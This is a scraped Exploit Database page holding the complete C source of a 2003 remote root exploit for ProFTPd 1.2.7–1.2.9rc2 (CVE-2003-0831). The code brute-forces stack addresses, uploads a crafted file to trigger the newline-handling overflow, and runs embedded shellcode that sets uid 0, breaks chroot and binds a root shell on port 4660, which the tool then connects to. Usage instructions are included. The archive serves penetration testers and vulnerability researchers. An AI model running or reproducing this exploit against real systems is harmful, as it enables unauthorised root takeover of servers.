Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 110
ProFTPd 1.2.7 < 1.2.9rc2 - Remote Code Execution / Brute Force - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDProFTPd 1.2.7 < 1.2.9rc2 - Remote Code Execution / Brute ForceEDB-ID:110CVE:2003-0831EDB Verified:Author:HaggisType:remoteExploit:/Platform:LinuxDate:2003-10-13Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*ProFTPd 1.2.7 - 1.2.9rc2 remote r00t exploit--------------------------------------------By HaggisThis exploit builds on the work of bkbll tocreate a working, brute-force remote exploitfor the \n procesing bug in ProFTPd.Tested on SuSE 8.0, 8.1 and RedHat 7.2/8.0it works quite well... the RedHat boxesworked on stack addresses in the 0xbffff2xxregion; the SuSE boxes were somewhat earlierin the stack space - around 0xbfffe8xx.This is the only public version you'll seefrom Haggis@Doris - but it is very likelythat more powerful private versions willbe coded.At present, this exploit breaks chroot (ifany) and spawns a shell bound to port 4660.----------This version is best run like so:./proft_put_down -t hostname -l localIP -U incomingwhere:hostname = target boxlocalIP = your IP address-U incoming specifies that the exploit will attemptto create an 'incoming' directory on the remote ftpserver and work inside that. Without it, the shell-code will probably not work properly. You have beenwarned!It is possible to use other credentials for loggingin to remote servers; anonymous is the default.H.*/#include <stdio.h>#include <ctype.h>#include <stdlib.h>#include <unistd.h>#include <errno.h>#include <netdb.h>#include <string.h>#include <signal.h>#include <stdarg.h>#include <sys/socket.h>#include <sys/types.h>#include <sys/time.h>#include <sys/select.h>#include <netinet/in.h>#include <arpa/inet.h>#include <linux/tcp.h>#define STACK_START 0xbfffef04#define STACK_END 0xbffff4f0#define FTP_PORT 21#define BINDSHELL_PORT 4660#define SIZE 1024#define EXPLOIT_BUF_SIZE 65535#define DEFAULT_USER "anonymous"#define DEFAULT_PASS "ftp@"#define FAILURE -1#define SUCCESS 0#define NORMAL_DOWNLOAD 1#define EXPLOIT_DOWNLOAD 2#define DOWNLOAD 3#define UPLOAD 4#define ACCEPT_TIMEOUT 5#define SLEEP_DELAY 19999999/*Leet 0-day HaggisCode (tm)*/char shellcode[] =// setuid(0); setgid(0);"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80"// fork() - parent terminates, killing proftpd and ending FTP// session. This leaves the child process as a daemon..."\x31\xc0\xb0\x02\xcd\x80\x89\xc3\x85\xdb\x74\x08\x31""\xdb\x31\xc0\xb0\x01\xcd\x80"// Finally, bind a shell to port 4660.// This is a hacked version of the bindshell code by BigHawk."\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80""\x89\xc7\x52\x66\x68\x12\x34\x43\x66\x53\x89\xe1\xb0\x10\x50\x51""\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50\x57""\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80""\x41\xe2\xf8\x51\x68\x2e\x2f\x61\x61\x89\xe3\x51\x53\x89\xe1\xb0""\x0b\xcd\x80";int controlSock, passiveSock;int currentPassivePort=32769;int currentServerPort=31337;int exploitBufLen;int attemptNumber=0;int ftpPort=FTP_PORT;unsigned int stackWriteAddr, retAddr;char serverBuf[SIZE];char exploitBuf[EXPLOIT_BUF_SIZE];char uploadPath[SIZE]="";char filename[SIZE*2];char *server=NULL;char *user=DEFAULT_USER;char *pass=DEFAULT_PASS;char *localIP=NULL;char errorBuf[SIZE];int connect_to_server(int port);int login_to_server();int set_passive_mode(int mode);int set_ascii_mode();int set_path_and_filename();int check_for_linefeed();int check_status();int create_passive_server();int create_exploit_buffer();int upload_file();int download_file(int mode);void usage(char *s);int do_remote_shell(int shellSock);void status_bar(char *info);int timeout_accept(int s, struct sockaddr *sa, int *f);void my_send(int s, char *b, ...);void my_recv(int s);void my_sleep(int n);void doris_chroot_breaker();int main(int argc,char **argv){int sleepMode=0;char c;unsigned int stackStartAddr=STACK_START;if(argc<2) usage(argv[0]);while((c = getopt(argc, argv, "t:u:p:l:U:sP:S:"))!= EOF) {switch (c) {case 't':server=optarg;break;case 'u':user=optarg;break;case 'p':pass=optarg;break;case 'l':localIP=optarg;break;case 's':sleepMode=1;break;case 'U':strncpy(uploadPath,optarg,SIZE);break;case 'P':ftpPort=atoi(optarg);break;case 'S':stackStartAddr=strtoul(optarg, NULL, 16);break;default:usage(argv[0]);return 1;}}if(server==NULL || localIP==NULL)usage(argv[0]);printf("proftpd 1.2.7 - 1.2.9rc2 remote r00t exploit\n");printf(" by Haggis (haggis@haggis.kicks-ass.net)\n");doris_chroot_breaker();for(stackWriteAddr=stackStartAddr; stackWriteAddr<STACK_END; stackWriteAddr+=4, attemptNumber++) {if(check_for_linefeed()==FAILURE)continue;retAddr=stackWriteAddr+200; // good enough for show businessif((controlSock=connect_to_server(ftpPort))==FAILURE) {perror("\n\nFailing to connect to remote host\n");exit(1);}if(login_to_server()==FAILURE) {close(controlSock);printf("\nERROR: Login failed.\n");exit(1);}if(set_passive_mode(UPLOAD)==FAILURE)goto err;if(set_ascii_mode()==FAILURE)goto err;if(set_path_and_filename()==FAILURE)goto err;// create the buffer containing RET for this// brute-force iterationcreate_exploit_buffer();if(upload_file()==FAILURE)goto err;close(controlSock);// Connect again, then login, set ASCII mode and download the exploit file.// This will trigger the overflow; as a result, we've// corrupted the memory pool of this session and when we// download the file again, the stack area will be overwritten// and we control the saved EIP.if((controlSock=connect_to_server(ftpPort))<0) {perror("\nFailed to connect to remote host\n");exit(1);}login_to_server(user,pass);set_path_and_filename();if(set_ascii_mode()==FAILURE)goto err;if(set_passive_mode(DOWNLOAD)==FAILURE)goto err;if(sleepMode)sleep(10);if(download_file(NORMAL_DOWNLOAD)==FAILURE)goto err;// Finally, read the file again. This will trigger the stack// overwrite (NOT the overflow, that happened earlier). We could// control EIP at this point and r00t may be only heartbeat away...if(set_passive_mode(DOWNLOAD)==FAILURE)goto err;if(download_file(EXPLOIT_DOWNLOAD)==FAILURE)goto err;err:close(controlSock);}// This is only reached if the bruteforce fails.// delete the exploit files hereprintf("\n\nNo r00t for you today I'm afraid.\n");exit(1);}void status_bar(char *info) {printf("[ %20s ]-[ Stack: 0x%08x ]-[ RET: 0x%08x ]\r",info, stackWriteAddr,retAddr);fflush(stdout);}int set_path_and_filename(){status_bar("Setting filename");if(strcmp(uploadPath,"")) {my_send(controlSock, "CWD %s\r\n",uploadPath);my_recv(controlSock);}snprintf(filename,SIZE,"proft_put_down-%d-%d.txt",getpid(),attemptNumber);return SUCCESS;}int download_file(int mode){int len, localServerSock, dataSock, bindShellSock;struct sockaddr_in localServer;status_bar("Downloading");// Ask the victim server to send us the exploit filemy_send(controlSock, "RETR %s\r\n", filename);// Create a listening server on our passive port to// receive the datamemset(&localServer,0,sizeof(localServer));localServerSock=create_passive_server();len=sizeof(localServer);// Wait for a few seconds for the victim server to contact us...if((dataSock=timeout_accept(localServerSock,(struct sockaddr *)&localServer,&len))<0) {close(localServerSock);return FAILURE;}// If the mode is EXPLOIT_DOWNLOAD, then this is the// second attempt at downloading... that means we might// have a shell waiting for us on the victim server, so// we try to connect to itif(mode==EXPLOIT_DOWNLOAD) {if((bindShellSock=connect_to_server(BINDSHELL_PORT))>=0) {printf("\nConnected! You are r00t...\n");do_remote_shell(bindShellSock);printf("\nDid you have a nice time?\n");exit(0);}close(dataSock);close(localServerSock);return SUCCESS;}// If the mode is NORMAL_DOWNLOAD, then just clean up the// connection by receiving the file from the server; closing// the data and local server sockets, then read the confirmation// message from the control socketmy_recv(dataSock);close(dataSock);close(localServerSock);my_recv(controlSock);return check_status();}int timeout_accept(int s, struct sockaddr *sa, int *f){fd_set fdset;struct timeval timeout = { ACCEPT_TIMEOUT, 0 }; // secondsint result;if(s<=0)return FAILURE;FD_ZERO(&fdset);FD_SET(s, &fdset);if((result=select(s+1, &fdset, 0, 0, &timeout))==0)return FAILURE;return accept(s,sa,f);}int set_passive_mode(int mode){int portMSB, portLSB;int x1,x2,x3,x4;char *ptr=localIP, *start;status_bar("Setting passive");if(mode==DOWNLOAD) {if((++currentPassivePort) > 35000)currentPassivePort=32789;while(*(++ptr))if(*ptr=='.')*ptr=',';portMSB=(currentPassivePort >> 8 ) & 0xff;portLSB=currentPassivePort & 0xff;my_send(controlSock, "PORT %s,%d,%d\r\n", localIP, portMSB, portLSB);my_recv(controlSock);return check_status();} else {my_send(controlSock, "PASV\r\n");my_recv(controlSock);if(check_status()==FAILURE)return FAILURE;ptr=serverBuf;while(*ptr && *ptr!='(')ptr++;if(*ptr=='\0')return FAILURE;start=ptr+1;while(*ptr && *ptr!=')')ptr++;*ptr=0;sscanf(start, "%d,%d,%d,%d,%d,%d",&x1, &x2, &x3, &x4, &portMSB, &portLSB);currentServerPort=(portMSB << 8) | portLSB;}return SUCCESS;}int connect_to_server(int port){struct sockaddr_in serverAddr;struct hostent *host;int sock, tmp=1;status_bar("Connecting");if((host=gethostbyname(server))==NULL)return FAILURE;if((sock=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))<0)return FAILURE;bzero(&serverAddr,sizeof(struct sockaddr));serverAddr.sin_family=AF_INET;serverAddr.sin_port=htons(port);serverAddr.sin_addr=*((struct in_addr *)host->h_addr);setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (void *)&tmp, sizeof(tmp));if(connect(sock,(struct sockaddr *)&serverAddr,sizeof(struct sockaddr))<0) {close(sock);return FAILURE;}return sock;}int check_status(){if(isdigit(serverBuf[0]) && serverBuf[0]!='5')return SUCCESS;elsereturn FAILURE;}int login_to_server(){status_bar("Logging in");my_recv(controlSock);my_send(controlSock, "USER %s\r\n", user);my_recv(controlSock);if(check_status()==FAILURE)return FAILURE;my_send(controlSock, "PASS %s\r\n", pass);my_recv(controlSock);return check_status();}int set_ascii_mode(){status_bar("Setting ASCII mode");my_send(controlSock, "TYPE A\r\n");my_recv(controlSock);return check_status();}int upload_file(){int dataSock;status_bar("Uploading file");// open up the data channelif((dataSock=connect_to_server(currentServerPort))==FAILURE)return FAILURE;// tell server we're gonna send some shiznitzmy_send(controlSock, "STOR %s\r\n", filename);my_recv(controlSock);if(check_status()==FAILURE) {close(dataSock);return FAILURE;}// send the exploit file to the victim serversend(dataSock, exploitBuf, exploitBufLen, 0);close(dataSock);// make sure all went wellmy_recv(controlSock);if(check_status()==FAILURE)return FAILURE;return SUCCESS;}int create_exploit_buffer(){int i;char buf[41];unsigned int writeaddr=stackWriteAddr;unsigned int *ptr=(unsigned int *)(exploitBuf+3);unsigned int dummy=0x11111111;FILE *fp;status_bar("Make exploit buf");exploitBufLen=1024;memset(exploitBuf,0,EXPLOIT_BUF_SIZE);memset(exploitBuf,0x90,512);*(ptr++)=writeaddr+28;for(i=0;i<6;i++)*(ptr++)=retAddr;*(ptr++)=0;for(i=0;i<2;i++)*(ptr++)=retAddr;memcpy(exploitBuf+512-strlen(shellcode)-1,shellcode,strlen(shellcode));memset(exploitBuf+512,'\n',512);for(i=0;i<96;i++) {memset(buf,0,41);if(dummy==0x1111112e)// this sets session.d->outstrm to NULL which forces an early return// avoids crashing proftpd... on SuSE 8.0 anywayz...memcpy(buf,"\n\n\n\n\n\n\n\n\x00\x00\x00\x00\n\n\n\n\n\n\n\n",20);else if(dummy==0x11111166)// this is the same thing tailored for RH7.2memcpy(buf,"\n\n\n\n\n\n\n\n\x72\x00\x00\x00\x00\n\n\n\n\n\n\n",20);elsememset(buf,'\n',20);// i used these dummy values to find the correct spot for// the session.d->outstrm pointer*(unsigned int *)(buf+20)=dummy;*(unsigned int *)(buf+24)=dummy;*(unsigned int *)(buf+28)=dummy;// this will become the address of an available chunk of memory// that is returned by new_block() in pool.c*(unsigned int *)(buf+32)=writeaddr;// this is what will be returned by palloc() in pool.c// palloc() is the function that calls new_block() and// provides the allocation interface for the pools system.*(unsigned int *)(buf+36)=writeaddr;memcpy(exploitBuf+exploitBufLen,buf,40);exploitBufLen+=40;dummy++;}return SUCCESS;}int create_passive_server(){struct sockaddr_in serverAddr;int on=1,sock;status_bar("Creating server");sock=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);memset(&serverAddr,0,sizeof(struct sockaddr_in));serverAddr.sin_port=htons(currentPassivePort);serverAddr.sin_family=AF_INET;serverAddr.sin_addr.s_addr=htonl(INADDR_ANY);setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(on));if(bind(sock,(struct sockaddr *)&serverAddr,sizeof(struct sockaddr))<0) {close(sock);return FAILURE;}if(listen(sock,5)<0) {close(sock);return FAILURE;}return sock;}void usage(char *exploitName){printf("proftpd 1.2.7 - 1.2.9rc2 remote root exploit\n");printf(" based on code by bkbll (bkbll@cnhonker.net)\n");printf(" by Haggis (haggis@haggis.kicks-ass.net)\n");printf("--------------------------------------------------------------\n");printf("Usage: %s -t host -l ip [options]\n",exploitName);printf("Arguments:\n");printf(" -t <host> host to attack\n");printf(" -u <username> [anonymous]\n");printf(" -p <password> [ftp@microsoft.com]\n");printf(" -l <local ip address> interface to bind to\n");printf(" -s sleep for 10secs to allow GDB attach\n");printf(" -U <path> specify upload path, eg. /incoming\n");printf(" -P <port> port number of remote proftpd server\n");printf(" -S <address> start at <address> when bruteforcing\n");exit(0);}int do_remote_shell(int shellSock){fd_set rfds;char buf[1024];int retval, r=1;do {FD_ZERO(&rfds);FD_SET(0, &rfds);FD_SET(shellSock, &rfds);retval=select(shellSock+1, &rfds, NULL, NULL, NULL);if(retval) {if(FD_ISSET(shellSock, &rfds)) {buf[(r=recv(shellSock, buf, sizeof(buf)-1,0))]='\0'; // lolprintf("%s", buf);fflush(stdout);}if(FD_ISSET(0, &rfds)) {buf[(r=read(0, buf, sizeof(buf)-1))]='\0'; // lmfaosend(shellSock, buf, strlen(buf), 0);}}} while(retval && r); // loop until connection terminatesreturn SUCCESS;}int check_for_linefeed(){char *ptr=(char *)&stackWriteAddr;int i=4;for(;i;i--)if(*(ptr++)=='\n')return FAILURE;return SUCCESS;}// Handy little function to send formattable data down a socket.void my_send(int s, char *b, ...) {va_list ap;char *buf;my_sleep(SLEEP_DELAY);va_start(ap,b);vasprintf(&buf,b,ap);send(s,buf,strlen(buf),0);va_end(ap);free(buf);}// Another handy function to read data from a socket.void my_recv(int s) {int len;my_sleep(SLEEP_DELAY);memset(serverBuf, 0, SIZE);len=recv(s, serverBuf, SIZE-1, 0);serverBuf[len]=0;}void doris_chroot_breaker() {char haggis_magic_buffer[]="\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x02\x00\x03\x00\x01\x00\x00\x00\x80\x80\x04\x08\x34\x00\x00\x00""\xa0\x01\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00""\x09\x00\x08\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08""\x00\x80\x04\x08\x20\x01\x00\x00\x20\x01\x00\x00\x05\x00\x00\x00""\x00\x10\x00\x00\x01\x00\x00\x00\x20\x01\x00\x00\x20\x91\x04\x08""\x20\x91\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00""\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x55\x89\xe5\x83\xec\x6c\x57\x56\x53\x8d\x45\xa0\x8d\x7d\xa0\xbe""\xc0\x80\x04\x08\xfc\xb9\x17\x00\x00\x00\xf3\xa5\x66\xa5\xa4\x8d""\x45\xa0\x89\x45\x9c\x8b\x5d\x9c\xff\xd3\x8d\x65\x88\x5b\x5e\x5f""\x89\xec\x5d\xc3\x8d\xb6\x00\x00\x00\x00\x8d\xbf\x00\x00\x00\x00""\x31\xc0\x31\xdb\x40\x50\x89\xe1\x66\xbb\x73\x68\x53\x89\xe3\xb0""\x27\xcd\x80\x31\xc0\x89\xe3\xb0\x3d\xcd\x80\x31\xc9\xb1\x0a\x31""\xc0\x31\xdb\x66\xbb\x2e\x2e\x53\x89\xe3\xb0\x0c\xcd\x80\x49\x85""\xc9\x75\xec\x31\xc0\x31\xdb\xb3\x2e\x53\x89\xe3\xb0\x3d\xcd\x80""\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52""\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x00\x00""\x00\x47\x43\x43\x3a\x20\x28\x47\x4e\x55\x29\x20\x32\x2e\x39\x35""\x2e\x33\x20\x32\x30\x30\x31\x30\x33\x31\x35\x20\x28\x53\x75\x53""\x45\x29\x00\x08\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x30""\x31\x2e\x30\x31\x00\x00\x00\x00\x2e\x73\x79\x6d\x74\x61\x62\x00""\x2e\x73\x74\x72\x74\x61\x62\x00\x2e\x73\x68\x73\x74\x72\x74\x61""\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00""\x2e\x64\x61\x74\x61\x00\x2e\x73\x62\x73\x73\x00\x2e\x62\x73\x73""\x00\x2e\x63\x6f\x6d\x6d\x65\x6e\x74\x00\x2e\x6e\x6f\x74\x65\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00\x01\x00\x00\x00""\x06\x00\x00\x00\x80\x80\x04\x08\x80\x00\x00\x00\x40\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00""\x21\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\xc0\x80\x04\x08""\xc0\x00\x00\x00\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x20\x00\x00\x00\x00\x00\x00\x00\x29\x00\x00\x00\x01\x00\x00\x00""\x03\x00\x00\x00\x20\x91\x04\x08\x20\x01\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00""\x2f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x20\x91\x04\x08""\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x01\x00\x00\x00\x00\x00\x00\x00\x35\x00\x00\x00\x08\x00\x00\x00""\x03\x00\x00\x00\x20\x91\x04\x08\x20\x01\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00""\x3a\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x20\x01\x00\x00\x23\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x01\x00\x00\x00\x00\x00\x00\x00\x43\x00\x00\x00\x07\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x43\x01\x00\x00\x14\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00""\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x57\x01\x00\x00\x49\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x01\x00\x00\x00\x00\x00\x00\x00";strcpy(filename, "aa");memset(exploitBuf,0,777);memcpy(exploitBuf, haggis_magic_buffer, 776);exploitBufLen=776;if((controlSock=connect_to_server(ftpPort))==FAILURE) {printf("\nCould not connect to target server\n");exit(1);}login_to_server();my_send(controlSock, "MKD incoming\r\n");my_recv(controlSock);my_send(controlSock, "SITE CHMOD 777 incoming\r\n");my_recv(controlSock);my_send(controlSock, "CWD incoming\r\n");my_recv(controlSock);set_passive_mode(UPLOAD);upload_file();my_send(controlSock, "SITE CHMOD 777 aa\r\n");close(controlSock);}// Wrapper for nanosleep()... just pass 'n' nanoseconds to it.void my_sleep(int n) {struct timespec t;t.tv_sec=0;t.tv_nsec=n;nanosleep(&t,&t);}// milw0rm.com [2003-10-13]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort14212223254249536669707980811021051101111131191231351391431611621643833894024064114434444454465025045135145155325485545556176236316556897837878088738889019981000104010891099110011141120119412351471152115331581158916041617172317431761181218581861190019472000202220492100210321212125218122422315237523802381240124802525264028102812294729542990300030303050305231283129318132003217330633333378338934603465350035353632369037903814381740004002407040814105411143224343443445014555459246614750484850005060506150805081509351515180524752505272530854325466555455555600565556665800580358145858590059846066607060806082610161126129637965026503666066677001700270707071708071007144721072727290742674437510754776497770777777787787787979028000800180028004800880208022802380288030808080818082808880908181830084008443844584738500858586198800881288398880888890009001900290809090909191009124920092519256944394479784978898559876990099879993999910000100011008010202102031044310616